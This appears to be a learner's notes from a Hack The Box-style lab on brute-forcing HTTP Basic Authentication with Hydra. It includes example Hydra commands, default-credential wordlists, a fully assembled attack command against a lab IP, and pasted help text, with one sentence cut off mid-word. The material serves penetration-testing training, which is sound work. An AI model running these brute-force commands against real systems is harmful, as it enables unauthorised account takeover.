## Table of Contents

    - [Hydra](#Hydra)
  - [Finding Default Passwords](#Finding\Default\Passwords)
        - [List for finding default credentials](#List\for\finding\default\credentials)

#defaultpasswords #hydra 
As we saw when we visited the website, it prompted the `Basic HTTP Authentication` form to input the username and password. Basic HTTP Authentication usually responses with an HTTP `401 Unauthorized` response code. As we mentioned previously, we will resort to a Brute Forcing attack, as we do not have enough information to attempt a different type of attack, which we will cover in this section.




### Hydra
Used for:
	Login brute forcing

**To install**:
```bash
sudo apt install hydra -y
```

```bash
Examples:
  hydra -l user -P passlist.txt ftp://192.168.0.1
  
  hydra -L userlist.txt -p defaultpw imap://192.168.0.1/PLAIN
  
  hydra -C defaults.txt -6
  pop3s://[2001:db8::1]:143/TLS:DIGEST-MD5
  
  
  hydra -l admin -p password ftp://[192.168.0.0/24]/
  
  hydra -L logins.txt -P pws.txt -M targets.txt ssh
```


## Finding Default Passwords
Don't know which user to brute force, will have to brute force both fields. Can either procide different wordlists for the usernames and passwords and iterate over all possible combinations. `Should be used a last resort`

##### List for finding default credentials
```bash
/usr/share/wordlists/seclists/Passwords/Default-Credentials
```

 In this case, we will pick `ftp-betterdefaultpasslist.txt` as it seems to be the most relevant to our case since it contains a variety of default user/password combinations. We will be using the following flags, based on help page above:

|**Options**|**Description**|
|---|---|
|`-C ftp-betterdefaultpasslist.txt`|Combined Credentials Wordlist|
|`SERVER_IP`|Target IP|
|`-s PORT`|Target Port|
|`http-get`|Request Method|
|`/`|Target Path|


The assembled command results:

```shell
gdxqpardo@htb[/htb]$ hydra -C /opt/useful/SecLists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt 178.211.23.155 -s 31099 http-get /
```

y common for administrators to overlook test or default accounts and their credentials. That is why it is always advised to start by scanning for default credentials, as they are very commonly left unchanged.
```bash

Options:
<...SNIP...>
  -s PORT   if the service is on a different default port, define it here
  -l LOGIN or -L FILE  login with LOGIN name, or load several logins from FILE
  -p PASS  or -P FILE  try password PASS, or load several passwords from FILE
  -u        loop around users, not passwords (effective! implied with -x)
  -f / -F   exit when a login/pass pair is found (-M: -f per host, -F global)
  server    the target: DNS, IP or 192.168.0.0/24 (this OR the -M option)
  service   the service to crack (see below for supported protocols)

<...SNIP...>

Examples:
  hydra -l user -P passlist.txt ftp://192.168.0.1
  hydra -L userlist.txt -p defaultpw imap://192.168.0.1/PLAIN
  hydra -C defaults.txt -6 pop3s://[2001:db8::1]:143/TLS:DIGEST-MD5
  hydra -l admin -p password ftp://[192.168.0.0/24]/
  hydra -L logins.txt -P pws.txt -M targets.txt ssh

```













